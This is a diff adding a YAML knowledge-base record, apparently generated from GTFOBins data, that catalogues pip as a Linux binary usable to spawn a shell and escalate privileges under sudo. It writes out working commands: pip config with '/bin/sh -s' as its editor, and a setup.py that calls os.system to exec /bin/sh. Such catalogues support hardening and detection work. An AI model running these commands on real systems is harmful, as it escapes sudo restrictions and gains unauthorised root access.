@@ -1,0 +1,99 @@
+id: gtfobins/pip/shell/sudo
+type: binary
+platform: linux
+name: pip
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: pip config --editor '/bin/sh -s' edit
+references:
+- https://gtfobins.github.io/gtfobins/pip/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        pip:
+          functions:
+            inherit:
+            - code: 'echo ''...'' >setup.py
+
+                pip install --break-system-packages .'
+              comment: 'This allows to run Python code (`...`). It executes a Python script named `setup.py`
+                in the directory passed as argument (`.`).
+
+
+                Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:
+
+
+                ```
+
+                echo ''import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")'' >setup.py
+
+                ```
+
+
+                The `--break-system-packages` flag can be omitted in older systems.'
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: python
+            shell:
+            - code: pip config --editor '/bin/sh -s' edit
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/pip/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:b807507a49ab022150eb46ef39019555aa9163c0f1ae647a3a7f7fa1c1934ba9
